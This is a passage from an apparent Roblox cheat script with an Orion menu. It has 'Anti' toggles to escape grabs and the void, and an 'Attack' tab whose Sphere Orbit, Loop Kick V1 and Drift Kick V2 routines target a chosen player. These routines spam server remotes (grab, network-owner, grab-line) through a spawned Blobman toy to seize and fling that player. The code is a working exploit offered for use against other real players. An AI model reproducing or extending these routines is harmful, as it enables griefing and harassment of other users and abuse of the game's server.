        local isHeld = LocalPlayer:FindFirstChild("IsHeld")
        if not isHeld then return end
        heldConnectionV2 = isHeld:GetPropertyChangedSignal("Value"):Connect(function()
            if not antiGrabV2Enabled or not isHeld.Value then return end
            local Char = LocalPlayer.Character
            if not Char then return end
            local Root = Char:FindFirstChild("HumanoidRootPart")
            local Hum = Char:FindFirstChildOfClass("Humanoid")
            if not (Root and Hum) then return end
            for _, part in pairs(Char:GetDescendants()) do 
                if part:IsA("BasePart") then part.CanCollide = false end 
            end
            task.spawn(function()
                while antiGrabV2Enabled and isHeld.Value do
                    pcall(function()
                        if StruggleEvent then StruggleEvent:FireServer() end
                        if RagdollRemote then RagdollRemote:FireServer(Root, 0) end
                        if SetNetworkOwner then SetNetworkOwner:FireServer(Root, Root.CFrame) end
                    end)
                    task.wait(0.03)
                end
            end)
            task.spawn(function()
                while antiGrabV2Enabled and isHeld.Value do
                    pcall(function()
                        Hum.Sit = false
                        Hum:ChangeState(Enum.HumanoidStateType.GettingUp)
                        Hum:SetStateEnabled(Enum.HumanoidStateType.Jumping, true)
                        if Root then
                            Root.Anchored = true
                            Root.AssemblyLinearVelocity = Vector3.zero
                            Root.AssemblyAngularVelocity = Vector3.zero
                        end
                    end)
                    task.wait(0.03)
                end
                if Root then Root.Anchored = false end
            end)
        end)
        if isHeld.Value then
            local Char = LocalPlayer.Character
            local Root = Char and Char:FindFirstChild("HumanoidRootPart")
            if Root then Root.Anchored = true end
            task.spawn(function()
                while antiGrabV2Enabled and isHeld.Value do
                    if StruggleEvent then StruggleEvent:FireServer() end
                    task.wait(0.05)
                end
                if Root then Root.Anchored = false end
            end)
        end
    end

    AntiTab:AddToggle({
        Name = "Anti Grab V2 (Enhanced)",
        Default = false,
        Callback = function(Value)
            antiGrabV2Enabled = Value
            if Value then
                PlayActionSound()
                StartAntiGrabV2()
                OrionLib:MakeNotification({ Name = "Anti Grab V2", Content = "Enabled", Time = 3 })
            else
                StopAntiGrabV2()
                OrionLib:MakeNotification({ Name = "Anti Grab V2", Content = "Disabled", Time = 3 })
            end
        end
    })

    LocalPlayer.CharacterAdded:Connect(function(char)
        task.wait(1)
        if antiGrabV2Enabled then StartAntiGrabV2() end
    end)

    AntiTab:AddParagraph("Description", 
        "Escape When Grabbed (Simple): Struggle spam + Anchor\n" ..
        "Anti Grab V2 (Enhanced): Collision off + Ragdoll release + Physics lock"
    )

    AntiTab:AddSection({ Name = "Anti Gucci" })

    local autoGucciActive = false
    local autoGucciConn = nil
    local autoGucciSpamTask = nil

    local function cleanupGucciTasks()
        if autoGucciSpamTask then
            task.cancel(autoGucciSpamTask)
            autoGucciSpamTask = nil
        end
    end

    local function SpawnGucciToy(toyName, hrp)
        if not SpawnToyRemote then return nil end
        local inv = Workspace:FindFirstChild(LocalPlayer.Name .. "SpawnedInToys")
        if not inv then return nil end
        local spawnCF = hrp.CFrame * CFrame.new(0, 14, 20)
        task.spawn(function()
            pcall(function() SpawnToyRemote:InvokeServer(toyName, spawnCF, Vector3.zero) end)
        end)
        local t = tick()
        local spawnedToy = nil
        repeat
            task.wait(0.1)
            spawnedToy = inv:FindFirstChild(toyName)
        until spawnedToy or (tick() - t > 3)
        return spawnedToy
    end

    local function StartGucci()
        if autoGucciConn then autoGucciConn:Disconnect() end
        local GucciThing = nil
        local isActive = false
        local function gucci()
            if not autoGucciActive then return end
            isActive = true
            local char = LocalPlayer.Character
            if not char then isActive = false return end
            local hrp = char:FindFirstChild("HumanoidRootPart")
            local hum = char:FindFirstChild("Humanoid")
            local inv = Workspace:FindFirstChild(LocalPlayer.Name .. "SpawnedInToys")
            if not (hrp and hum and inv) then isActive = false return end
            cleanupGucciTasks()
            if DestroyToy then
                for _, v in pairs(inv:GetChildren()) do
                    if v.Name == "AutoGucci" or v.Name == "TractorGreen" then
                        pcall(function() DestroyToy:FireServer(v) end)
                    end
                end
            end
            local isHeld = LocalPlayer:FindFirstChild("IsHeld")
            while isHeld and isHeld.Value do task.wait() end
            hum.Sit = false
            task.wait(0.1)
            GucciThing = SpawnGucciToy("TractorGreen", hrp)
            while not GucciThing and autoGucciActive do
                task.wait(0.25)
                GucciThing = SpawnGucciToy("TractorGreen", hrp)
            end
            if not GucciThing then isActive = false return end
            GucciThing.Name = "AutoGucci"
            local seat = GucciThing:FindFirstChild("VehicleSeat")
            if not seat then isActive = false return end
            autoGucciSpamTask = task.spawn(function()
                while isActive and autoGucciActive do
                    if RagdollRemote then pcall(function() RagdollRemote:FireServer(hrp, 0) end) end
                    if StruggleEvent then pcall(function() StruggleEvent:FireServer(LocalPlayer) end) end
                    task.wait(0.05)
                end
            end)
            local t0 = tick()
            while not hum.SeatPart and autoGucciActive and tick() - t0 < 3 do
                seat:Sit(hum)
                task.wait(0.1)
            end
            hum.Sit = false
            hum:ChangeState(Enum.HumanoidStateType.Jumping)
            hrp.Anchored = true
            task.spawn(function()
                task.wait(0.3)
                GucciThing:PivotTo(CFrame.new(0, 1e6, 0))
                for _, p in pairs(GucciThing:GetDescendants()) do
                    if p:IsA("BasePart") then p.Anchored = true end
                end
            end)
            hrp.Anchored = false
            isActive = false
        end
        gucci()
        autoGucciConn = RunService.Heartbeat:Connect(function()
            if not autoGucciActive then return end
            if isActive then return end
            local char = LocalPlayer.Character
            local hrp = char and char:FindFirstChild("HumanoidRootPart")
            local hum = char and char:FindFirstChild("Humanoid")
            local isHeld = LocalPlayer:FindFirstChild("IsHeld")
            if not (hrp and hum) or hum.Health <= 0 then
                isActive = true
                LocalPlayer.CharacterAdded:Wait()
                task.wait(0.5)
                gucci()
                return
            end
            if (isHeld and isHeld.Value) or hum.Sit then gucci() end
        end)
    end

    AntiTab:AddToggle({
        Name = "Anti Gucci",
        Default = false,
        Callback = function(Value)
            autoGucciActive = Value
            if Value then
                PlayActionSound()
                StartGucci()
                OrionLib:MakeNotification({ Name = "Anti Gucci", Content = "Enabled", Time = 3 })
            else
                cleanupGucciTasks()
                if autoGucciConn then autoGucciConn:Disconnect() autoGucciConn = nil end
                local inv = Workspace:FindFirstChild(LocalPlayer.Name .. "SpawnedInToys")
                if inv and DestroyToy then
                    for _, v in pairs(inv:GetChildren()) do
                        if v.Name == "AutoGucci" or v.Name == "TractorGreen" then
                            pcall(function() DestroyToy:FireServer(v) end)
                        end
                    end
                end
                OrionLib:MakeNotification({ Name = "Anti Gucci", Content = "Disabled", Time = 3 })
            end
        end
    })

    AntiTab:AddSection({ Name = "Anti Void" })
    AntiTab:AddToggle({
        Name = "Anti Void",
        Default = false,
        Callback = function(Value)
            if Value then
                PlayActionSound()
                Workspace.FallenPartsDestroyHeight = 0/0
                OrionLib:MakeNotification({ Name = "Anti Void", Content = "Enabled", Time = 3 })
            else
                Workspace.FallenPartsDestroyHeight = -100
                OrionLib:MakeNotification({ Name = "Anti Void", Content = "Disabled", Time = 3 })
            end
        end
    })

    AntiTab:AddParagraph("Note", "Anti Void prevents falling into the void")
end

-- ============================================================================
-- Block 31: Attack Tab
-- ============================================================================
do
    local Window = _G.Window
    local OrionLib = _G.OrionLib
    local Players = _G.Players
    local LocalPlayer = _G.LocalPlayer
    local ReplicatedStorage = _G.ReplicatedStorage
    local RunService = _G.RunService
    local Workspace = _G.Workspace
    local UserInputService = _G.UserInputService
    local Theme = _G.Theme

    -- Sphere Orbit Kick V1
    local SphereOrbitKick = {}
    do
        local ORBIT_RADIUS = 12
        local ORBIT_SPEED = 60
        local ORBIT_HEIGHT = 10
        local SPHERE_TILT = 0.9
        local SPHERE_COMPLEXITY = 0.7
        local EFFECTS_ENABLED = true
        local PARTICLE_COUNT = 50
        local orbitRunning = false
        local orbitAngle = 0
        local effectParts = {}
        local currentLoopId = 0

        local function getOrbitPlayerNames()
            local names = {}
            local map = {}
            for _, player in ipairs(Players:GetPlayers()) do
                if player ~= LocalPlayer then
                    local displayStr = player.DisplayName .. " (@ " .. player.Name .. ")"
                    table.insert(names, displayStr)
                    map[displayStr] = player.Name
                end
            end
            return names, map
        end

        local function calculateSpherePosition(angle, radius, height, tilt, complexity)
            local hAngle = angle
            local vAngle = math.sin(angle * 0.5 + math.cos(angle * 0.2) * 0.3) * math.pi * 0.5 + math.pi * 0.5
            local complexityOffset = math.sin(angle * complexity) * 0.3
            local x = math.cos(hAngle + complexityOffset) * radius * math.sin(vAngle)
            local y = math.cos(vAngle + angle * 0.1) * radius * tilt + height + math.sin(angle * 0.7) * 1.5
            local z = math.sin(hAngle + complexityOffset) * radius * math.sin(vAngle)
            return Vector3.new(x, y, z)
        end

        local function createOrbitEffect(position, color)
            if not EFFECTS_ENABLED then return end
            local trailPart = Instance.new("Part")
            trailPart.Size = Vector3.new(0.3, 0.3, 0.3)
            trailPart.Position = position
            trailPart.Anchored = true
            trailPart.CanCollide = false
            trailPart.Material = Enum.Material.Neon
            trailPart.BrickColor = BrickColor.new(color or "Bright violet")
            trailPart.Transparency = 0.3
            trailPart.Parent = workspace
            game:GetService("Debris"):AddItem(trailPart, 0.3)
            if #effectParts < PARTICLE_COUNT then table.insert(effectParts, trailPart) end
        end

        local function getBlobman()
            local inv = Workspace:FindFirstChild(LocalPlayer.Name .. "SpawnedInToys")
            if inv then
                local blob = inv:FindFirstChild("CreatureBlobman")
                if blob and blob:FindFirstChild("VehicleSeat") then return blob end
            end
            return nil
        end

        local function spawnBlobman()
            local mt = ReplicatedStorage:FindFirstChild("MenuToys")
            if not mt then return nil end
            local st = mt:FindFirstChild("SpawnToyRemoteFunction")
            if not st then return nil end
            local char = LocalPlayer.Character
            if not char then return nil end
            local root = char:FindFirstChild("HumanoidRootPart")
            if not root then return nil end
            local spawnCF = root.CFrame + Vector3.new(0, 5, 0)
            pcall(function() st:InvokeServer("CreatureBlobman", spawnCF, Vector3.zero) end)
            task.wait(0.8)
            return getBlobman()
        end

        local function sitOnBlobman(blob)
            if not blob then return false end
            local seat = blob:FindFirstChild("VehicleSeat")
            if not seat then return false end
            local hum = LocalPlayer.Character and LocalPlayer.Character:FindFirstChildOfClass("Humanoid")
            if not hum then return false end
            if seat.Occupant ~= hum then
                local root = LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
                if root then
                    root.CFrame = seat.CFrame + Vector3.new(0, 2, 0)
                    task.wait(0.2)
                end
                seat:Sit(hum)
                task.wait(0.5)
            end
            return true
        end

        function SphereOrbitKick.kick(playerName)
            local target = Players:FindFirstChild(playerName)
            if not target then
                PlayErrorSound()
                OrionLib:MakeNotification({ Name = "Error", Content = "Player not found", Time = 3 })
                return false
            end
            if target == LocalPlayer then
                PlayErrorSound()
                OrionLib:MakeNotification({ Name = "Error", Content = "Cannot target yourself", Time = 3 })
                return false
            end
            if orbitRunning then
                PlayErrorSound()
                OrionLib:MakeNotification({ Name = "Error", Content = "Already running", Time = 3 })
                return false
            end
            orbitRunning = true
            currentLoopId = currentLoopId + 1
            local myLoopId = currentLoopId
            local targetPlayer = target
            task.spawn(function()
                local blobman = getBlobman()
                if not blobman then
                    blobman = spawnBlobman()
                    if not blobman then
                        PlayErrorSound()
                        OrionLib:MakeNotification({ Name = "Error", Content = "Failed to spawn Blobman", Time = 3 })
                        orbitRunning = false
                        return
                    end
                end
                if not sitOnBlobman(blobman) then
                    PlayErrorSound()
                    OrionLib:MakeNotification({ Name = "Error", Content = "Could not sit on Blobman", Time = 3 })
                    orbitRunning = false
                    return
                end
                local scriptObj = blobman:FindFirstChild("BlobmanSeatAndOwnerScript")
                if not scriptObj then
                    PlayErrorSound()
                    orbitRunning = false
                    return
                end
                local grabRemote = scriptObj:FindFirstChild("CreatureGrab")
                local dropRemote = scriptObj:FindFirstChild("CreatureDrop")
                local GE = ReplicatedStorage:FindFirstChild("GrabEvents")
                if not (grabRemote and dropRemote and GE) then
                    PlayErrorSound()
                    orbitRunning = false
                    return
                end
                local lDet = blobman:FindFirstChild("LeftDetector")
                local rDet = blobman:FindFirstChild("RightDetector")
                local lWeld = lDet and (lDet:FindFirstChild("LeftWeld") or lDet:FindFirstChild("RigidConstraint"))
                local rWeld = rDet and (rDet:FindFirstChild("RightWeld") or rDet:FindFirstChild("RigidConstraint"))
                if not ((lDet and lWeld) or (rDet and rWeld)) then
                    PlayErrorSound()
                    orbitRunning = false
                    return
                end
                local Det = rDet or lDet
                local Weld = rWeld or lWeld
                local blobRoot = blobman:FindFirstChild("HumanoidRootPart") or blobman.PrimaryPart
                if not blobRoot then
                    PlayErrorSound()
                    orbitRunning = false
                    return
                end
                local targetChar = targetPlayer.Character
                if not targetChar then
                    PlayErrorSound()
                    orbitRunning = false
                    return
                end
                local targetRoot = targetChar:FindFirstChild("HumanoidRootPart")
                if not targetRoot then
                    PlayErrorSound()
                    orbitRunning = false
                    return
                end
                local bringStart = tick()
                while tick() - bringStart < 0.35 do
                    if myLoopId ~= currentLoopId or not orbitRunning then orbitRunning = false return end
                    if targetPlayer.Character and targetPlayer.Character:FindFirstChild("HumanoidRootPart") then
                        local currentTRoot = targetPlayer.Character.HumanoidRootPart
                        blobRoot.CFrame = currentTRoot.CFrame
                        blobRoot.AssemblyLinearVelocity = Vector3.zero
                        pcall(function()
                            if Det then grabRemote:FireServer(Det, currentTRoot, Weld) end
                            GE.CreateGrabLine:FireServer(currentTRoot, Vector3.zero, currentTRoot.Position, false)
                            GE.SetNetworkOwner:FireServer(currentTRoot, blobRoot.CFrame)
                        end)
                    end
                    RunService.Heartbeat:Wait()
                end
                local SavedPos = targetRoot.CFrame
                local targetCenterCFrame = SavedPos + Vector3.new(0, ORBIT_HEIGHT, 0)
                local lastTime = tick()
                local lastDropTime = tick()
                local dropCount = 0
                local effectTimer = 0
                OrionLib:MakeNotification({ Name = "Sphere Orbit Kick", Content = "Running on " .. targetPlayer.Name, Time = 2 })
                while orbitRunning and blobman and blobman.Parent do
                    if myLoopId ~= currentLoopId then break end
                    if not targetPlayer or not targetPlayer.Parent or not targetPlayer.Character then break end
                    local tChar = targetPlayer.Character
                    local tRoot = tChar:FindFirstChild("HumanoidRootPart")
                    local tHum = tChar:FindFirstChild("Humanoid")
                    if dropCount < 3 and (tick() - lastDropTime) > 0.6 then
                        dropCount = dropCount + 1
                        pcall(function()
                            local currentWeld = Det:FindFirstChild("RightWeld") or Det:FindFirstChild("LeftWeld") or Det:FindFirstChildWhichIsA("Weld") or Det:FindFirstChild("RigidConstraint")
                            if currentWeld then dropRemote:FireServer(currentWeld) end
                            GE.DestroyGrabLine:FireServer(tRoot)
                        end)
                        blobRoot.CFrame = SavedPos
                        blobRoot.AssemblyLinearVelocity = Vector3.zero
                        task.wait(0.05)
                        local reCaptureStart = tick()
                        while tick() - reCaptureStart < 0.25 do
                            if myLoopId ~= currentLoopId or not orbitRunning or not blobman or not blobman.Parent then break end
                            if targetPlayer.Character and targetPlayer.Character:FindFirstChild("HumanoidRootPart") then
                                local currentTRoot = targetPlayer.Character.HumanoidRootPart
                                blobRoot.CFrame = currentTRoot.CFrame
                                blobRoot.AssemblyLinearVelocity = Vector3.zero
                                pcall(function()
                                    if Det then grabRemote:FireServer(Det, currentTRoot, Weld) end
                                    GE.CreateGrabLine:FireServer(currentTRoot, Vector3.zero, currentTRoot.Position, false)
                                    GE.SetNetworkOwner:FireServer(currentTRoot, blobRoot.CFrame)
                                end)
                            end
                            RunService.Heartbeat:Wait()
                        end
                        lastTime = tick()
                        lastDropTime = tick()
                    end
                    if tRoot and tHum and tHum.Health > 0 and blobRoot then
                        local currentTime = tick()
                        local dt = currentTime - lastTime
                        lastTime = currentTime
                        orbitAngle = orbitAngle + (ORBIT_SPEED * dt)
                        local offset = calculateSpherePosition(orbitAngle, ORBIT_RADIUS, ORBIT_HEIGHT, SPHERE_TILT, SPHERE_COMPLEXITY)
                        local blobPos = targetCenterCFrame.Position + offset
                        blobRoot.CFrame = CFrame.new(blobPos, targetCenterCFrame.Position)
                        blobRoot.AssemblyLinearVelocity = Vector3.zero
                        blobRoot.AssemblyAngularVelocity = Vector3.zero
                        tRoot.CFrame = targetCenterCFrame
                        tRoot.AssemblyLinearVelocity = Vector3.zero
                        tRoot.AssemblyAngularVelocity = Vector3.zero
                        effectTimer = effectTimer + dt
                        if EFFECTS_ENABLED and effectTimer > 0.05 then
                            effectTimer = 0
                            local colorIdx = math.floor((orbitAngle / (math.pi * 2)) % 10)
                            local colors = {"Bright violet", "Bright blue", "Bright red", "Bright yellow", "Bright green", "Bright orange", "Bright pink", "Cyan", "Magenta", "White"}
                            createOrbitEffect(blobPos, colors[colorIdx + 1] or "Bright violet")
                        end
                        pcall(function()
                            tHum.PlatformStand = true
                            tHum.Sit = true
                            GE.SetNetworkOwner:FireServer(tRoot, targetCenterCFrame)
                            local currentWeld = Det:FindFirstChild("RightWeld") or Det:FindFirstChild("LeftWeld") or Det:FindFirstChildWhichIsA("Weld") or Det:FindFirstChild("RigidConstraint")
                            if currentWeld then dropRemote:FireServer(currentWeld) end
                            GE.DestroyGrabLine:FireServer(tRoot)
                            if Det then grabRemote:FireServer(Det, tRoot, Weld) end
                            GE.CreateGrabLine:FireServer(tRoot, Vector3.zero, targetCenterCFrame.Position, false)
                        end)
                    else
                        break
                    end
                    RunService.Heartbeat:Wait()
                end
                if blobRoot and SavedPos then
                    pcall(function()
                        local currentWeld = Det:FindFirstChild("RightWeld") or Det:FindFirstChild("LeftWeld") or Det:FindFirstChildWhichIsA("Weld") or Det:FindFirstChild("RigidConstraint")
                        if currentWeld then dropRemote:FireServer(currentWeld) end
                        if targetPlayer and targetPlayer.Character and targetPlayer.Character:FindFirstChild("HumanoidRootPart") then
                            GE.DestroyGrabLine:FireServer(targetPlayer.Character.HumanoidRootPart)
                        end
                    end)
                    blobRoot.CFrame = SavedPos
                    blobRoot.AssemblyLinearVelocity = Vector3.zero
                end
                for _, part in ipairs(effectParts) do
                    if part and part.Parent then part:Destroy() end
                end
                effectParts = {}
                orbitRunning = false
                OrionLib:MakeNotification({ Name = "Sphere Orbit Kick", Content = "Finished", Time = 2 })
            end)
            return true
        end

        function SphereOrbitKick.stop()
            orbitRunning = false
            currentLoopId = currentLoopId + 1
            for _, part in ipairs(effectParts) do
                if part and part.Parent then part:Destroy() end
            end
            effectParts = {}
            OrionLib:MakeNotification({ Name = "Sphere Orbit Kick", Content = "Stopped", Time = 2 })
        end

        function SphereOrbitKick.isRunning() return orbitRunning end
        function SphereOrbitKick.setRadius(v) ORBIT_RADIUS = v or 12 end
        function SphereOrbitKick.setSpeed(v) ORBIT_SPEED = v or 60 end
        function SphereOrbitKick.setHeight(v) ORBIT_HEIGHT = v or 10 end
        function SphereOrbitKick.setTilt(v) SPHERE_TILT = v or 0.9 end
        function SphereOrbitKick.setComplexity(v) SPHERE_COMPLEXITY = v or 0.7 end
        function SphereOrbitKick.setEffects(v) EFFECTS_ENABLED = v end
        function SphereOrbitKick.getPlayers()
            local names, _ = getOrbitPlayerNames()
            return names
        end

        _G.SphereOrbitKick = SphereOrbitKick
    end

    local AttackTab = Window:MakeTab({ Name = "Attack", Icon = "rbxassetid://4483345998", PremiumOnly = false })
    AttackTab:AddParagraph("⚠️ Warning!", "Do NOT abuse!")
    AttackTab:AddSection({ Name = "Kick V1 (Blob Grab)" })

    local kickLoopEnabled = false
    local selectedKickPlayer = nil

    local function getPlayerTable()
        local players = {}
        for _, player in ipairs(Players:GetPlayers()) do 
            if player ~= LocalPlayer then table.insert(players, player.Name) end 
        end
        return players
    end

    local playerDropdown = AttackTab:AddDropdown({
        Name = "Target Player",
        Default = "",
        Options = getPlayerTable(),
        Callback = function(value)
            selectedKickPlayer = Players:FindFirstChild(value)
            if not selectedKickPlayer then PlayErrorSound() end
            OrionLib:MakeNotification({ Name = "Player Selected", Content = "Target: " .. value, Time = 2 })
        end
    })

    AttackTab:AddButton({
        Name = "Refresh Player List",
        Callback = function()
            PlayActionSound()
            playerDropdown:Refresh(getPlayerTable())
            OrionLib:MakeNotification({ Name = "Player List", Content = "List refreshed!", Time = 1 })
        end
    })

    local kickToggle = AttackTab:AddToggle({
        Name = "Loop Kick V1 (Grab + Blob)",
        Default = false,
        Callback = function(on)
            kickLoopEnabled = on
            if on and not selectedKickPlayer then
                PlayErrorSound()
                OrionLib:MakeNotification({ Name = "Error", Content = "Please select a target player first!", Time = 2 })
                kickToggle:SetValue(false)
                return
            end
            local char = LocalPlayer.Character
            local hum = char and char:FindFirstChild("Humanoid")
            local seat = hum and hum.SeatPart
            if on and (not seat or seat.Parent.Name ~= "CreatureBlobman") then
                PlayErrorSound()
                OrionLib:MakeNotification({ Name = "Error", Content = "You must be sitting on a Blob creature!", Time = 2 })
                kickToggle:SetValue(false)
                return
            end
            if not on then
                kickLoopEnabled = false
                OrionLib:MakeNotification({ Name = "Loop Kick V1", Content = "Loop kick stopped", Time = 1.5 })
                return
            end
            PlayActionSound()
            OrionLib:MakeNotification({ Name = "Loop Kick V1", Content = "Start: " .. selectedKickPlayer.Name, Time = 2 })
            task.spawn(function()
                local RS = ReplicatedStorage
                local GE = RS:WaitForChild("GrabEvents")
                local RunServiceLocal = RunService
                local blob = seat.Parent
                local blobRoot = blob:FindFirstChild("HumanoidRootPart") or blob.PrimaryPart
                local scriptObj = blob:FindFirstChild("BlobmanSeatAndOwnerScript")
                local CG = scriptObj and scriptObj:FindFirstChild("CreatureGrab")
                local CD = scriptObj and scriptObj:FindFirstChild("CreatureDrop")
                local R_Det = blob:FindFirstChild("RightDetector")
                local R_Weld = R_Det and (R_Det:FindFirstChild("RightWeld") or R_Det:FindFirstChildWhichIsA("Weld"))
                local SavedPos = blobRoot.CFrame
                local tChar = selectedKickPlayer.Character
                local tRoot = tChar and tChar:FindFirstChild("HumanoidRootPart")
                if tRoot and blobRoot then
                    local bringStart = tick()
                    while tick() - bringStart < 0.35 do
                        if not kickLoopEnabled then break end
                        blobRoot.CFrame = tRoot.CFrame
                        blobRoot.Velocity = Vector3.zero
                        pcall(function()
                            if CG and R_Det then CG:FireServer(R_Det, tRoot, R_Weld) end
                            GE.CreateGrabLine:FireServer(tRoot, Vector3.zero, tRoot.Position, false)
                            GE.SetNetworkOwner:FireServer(tRoot, blobRoot.CFrame)
                        end)
                        RunServiceLocal.Heartbeat:Wait()
                    end
                    blobRoot.CFrame = SavedPos
                    blobRoot.Velocity = Vector3.zero
                    task.wait(0.05)
                end
                local packetTimer = 0
                while kickLoopEnabled do
                    if not selectedKickPlayer or not selectedKickPlayer.Parent or not selectedKickPlayer.Character then break end
                    tChar = selectedKickPlayer.Character
                    tRoot = tChar and tChar:FindFirstChild("HumanoidRootPart")
                    local tHum = tChar and tChar:FindFirstChild("Humanoid")
                    if tRoot and tHum and tHum.Health > 0 and blobRoot then
                        blobRoot.CFrame = SavedPos
                        blobRoot.Velocity = Vector3.zero
                        local lockPos = SavedPos * CFrame.new(0, 23, 0)
                        tRoot.CFrame = lockPos
                        tRoot.Velocity = Vector3.zero
                        tRoot.RotVelocity = Vector3.zero
                        if tick() - packetTimer > 0.05 then
                            packetTimer = tick()
                            pcall(function()
                                tHum.PlatformStand = true
                                tHum.Sit = true
                                GE.SetNetworkOwner:FireServer(tRoot, lockPos)
                                if R_Det then
                                    local weld = R_Det:FindFirstChild("RightWeld") or R_Det:FindFirstChildWhichIsA("Weld")
                                    if weld then CD:FireServer(weld) end
                                end
                                GE.DestroyGrabLine:FireServer(tRoot)
                                if R_Det then CG:FireServer(R_Det, tRoot, R_Weld) end
                                GE.CreateGrabLine:FireServer(tRoot, Vector3.zero, tRoot.Position, false)
                            end)
                        end
                    else
                        blobRoot.CFrame = SavedPos
                        blobRoot.Velocity = Vector3.zero
                    end
                    if not kickLoopEnabled then break end
                    RunServiceLocal.Heartbeat:Wait()
                end
                kickLoopEnabled = false
                kickToggle:SetValue(false)
                if blobRoot then
                    blobRoot.CFrame = SavedPos
                    blobRoot.Velocity = Vector3.zero
                end
                OrionLib:MakeNotification({ Name = "Loop Kick V1", Content = "Stopped", Time = 1.5 })
            end)
        end
    })

    AttackTab:AddSection({ Name = "Kick V2 (Orbit & Grab)" })

    local orbitRunningV2 = false
    local selectedOrbitTargetName = ""
    local orbitRadius = 5
    local orbitSpeed = 10
    local orbitHeightOffset = 10
    local orbitAngleV2 = 0
    local orbitCurrentLoopIdV2 = 0
    local orbitPlayerMap = {}

    local function getOrbitPlayerNamesV2()
        local names = {}
        orbitPlayerMap = {}
        for _, player in ipairs(Players:GetPlayers()) do
            if player ~= LocalPlayer then
                local displayStr = player.DisplayName .. " (@ " .. player.Name .. ")"
                table.insert(names, displayStr)
                orbitPlayerMap[displayStr] = player.Name
            end
        end
        return names
    end

    local OrbitTargetDropdown = AttackTab:AddDropdown({
        Name = "Select Target",
        Default = "",
        Options = getOrbitPlayerNamesV2(),
        Callback = function(Value)
            selectedOrbitTargetName = orbitPlayerMap[Value] or ""
            if selectedOrbitTargetName == "" then PlayErrorSound() end
        end
    })

    AttackTab:AddButton({
        Name = "Refresh Player List",
        Callback = function()
            PlayActionSound()
            OrbitTargetDropdown:Refresh(getOrbitPlayerNamesV2(), true)
        end
    })

    AttackTab:AddToggle({
        Name = "Drift Kick V2",
        Default = false,
        Callback = function(v)
            orbitRunningV2 = v
            orbitCurrentLoopIdV2 = orbitCurrentLoopIdV2 + 1
            local myLoopId = orbitCurrentLoopIdV2
            if not v then return end
            PlayActionSound()
            local target = Players:FindFirstChild(selectedOrbitTargetName)
            if target and target ~= LocalPlayer and target.Character and target.Character:FindFirstChild("HumanoidRootPart") and LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart") then
                local blobman = nil
                local spawned = Workspace:FindFirstChild(LocalPlayer.Name .. "SpawnedInToys")
                if spawned then blobman = spawned:FindFirstChild("CreatureBlobman") end
                if not blobman then
                    local mt = ReplicatedStorage:FindFirstChild("MenuToys")
                    local st = mt and mt:FindFirstChild("SpawnToyRemoteFunction")
                    if st then
                        local myRoot = LocalPlayer.Character.HumanoidRootPart
                        local spawnCF = myRoot and (myRoot.CFrame + Vector3.new(0, 5, 0)) or CFrame.new(0, 50, 0)
                        st:InvokeServer("CreatureBlobman", spawnCF, Vector3.zero)
                        task.wait(0.8)
                        spawned = Workspace:FindFirstChild(LocalPlayer.Name .. "SpawnedInToys")
                        if spawned then blobman = spawned:FindFirstChild("CreatureBlobman") end
                    end
                end
                if not blobman then
                    for _, obj in ipairs(Workspace:GetChildren()) do
                        if obj.Name == "CreatureBlobman" and obj:FindFirstChild("VehicleSeat") then
                            blobman = obj
                            break
                        end
                    end
                end
                if blobman then
                    local scriptObj = blobman:FindFirstChild("BlobmanSeatAndOwnerScript")
                    local grabRemote = scriptObj and scriptObj:FindFirstChild("CreatureGrab")
                    local dropRemote = scriptObj and scriptObj:FindFirstChild("CreatureDrop")
                    local lDet = blobman:FindFirstChild("LeftDetector")
                    local rDet = blobman:FindFirstChild("RightDetector")
                    local lWeld = lDet and (lDet:FindFirstChild("LeftWeld") or lDet:FindFirstChild("RigidConstraint"))
                    local rWeld = rDet and (rDet:FindFirstChild("RightWeld") or rDet:FindFirstChild("RigidConstraint"))
                    local seat = blobman:FindFirstChild("VehicleSeat")
                    local hum = LocalPlayer.Character:FindFirstChild("Humanoid")
                    if seat and hum then
                        if seat.Occupant ~= hum then
                            LocalPlayer.Character.HumanoidRootPart.CFrame = seat.CFrame + Vector3.new(0, 2, 0)
                            task.wait(0.2)
                            seat:Sit(hum)
                            task.wait(0.5)
                        end
                    end
                    local GE = ReplicatedStorage:FindFirstChild("GrabEvents")
                    if GE and grabRemote and dropRemote and ((lDet and lWeld) or (rDet and rWeld)) then
                        OrionLib:MakeNotification({ Name = "Execute", Content = "Starting Drift Kick V2", Time = 3 })
                        task.spawn(function()
                            local blobRoot = blobman:FindFirstChild("HumanoidRootPart") or blobman.PrimaryPart
                            local Det = rDet or lDet
                            local Weld = rWeld or lWeld
                            local bringStart = tick()
                            while tick() - bringStart < 0.35 do
                                if myLoopId ~= orbitCurrentLoopIdV2 or not orbitRunningV2 or not blobman or not blobman.Parent then return end
                                if target.Character and target.Character:FindFirstChild("HumanoidRootPart") then
                                    local tRoot = target.Character.HumanoidRootPart
                                    blobRoot.CFrame = tRoot.CFrame
                                    blobRoot.AssemblyLinearVelocity = Vector3.zero
                                    pcall(function()
                                        if Det then grabRemote:FireServer(Det, tRoot, Weld) end
                                        GE.CreateGrabLine:FireServer(tRoot, Vector3.zero, tRoot.Position, false)
                                        GE.SetNetworkOwner:FireServer(tRoot, blobRoot.CFrame)
                                    end)
                                end
                                RunService.Heartbeat:Wait()
                            end
                            if not target.Character or not target.Character:FindFirstChild("HumanoidRootPart") then return end
                            local SavedPos = target.Character.HumanoidRootPart.CFrame
                            local targetCenterCFrame = SavedPos + Vector3.new(0, 30, 0)
                            local lastTime = tick()
                            local lastDropTime = tick()
                            local dropCount = 0
                            while orbitRunningV2 and blobman and blobman.Parent do
                                if myLoopId ~= orbitCurrentLoopIdV2 then break end
                                if not target or not target.Parent or not target.Character then break end
                                local tChar = target.Character
                                local tRoot = tChar:FindFirstChild("HumanoidRootPart")
                                local tHum = tChar:FindFirstChild("Humanoid")
                                if dropCount < 2 and (tick() - lastDropTime) > 0.8 then
                                    dropCount = dropCount + 1
                                    pcall(function()
                                        local currentWeld = Det:FindFirstChild("RightWeld") or Det:FindFirstChild("LeftWeld") or Det:FindFirstChildWhichIsA("Weld") or Det:FindFirstChild("RigidConstraint")
                                        if currentWeld then dropRemote:FireServer(currentWeld) end
                                        GE.DestroyGrabLine:FireServer(tRoot)
                                    end)
                                    blobRoot.CFrame = SavedPos
                                    blobRoot.AssemblyLinearVelocity = Vector3.zero
                                    task.wait(0.1)
                                    local reCaptureStart = tick()
                                    while tick() - reCaptureStart < 0.35 do
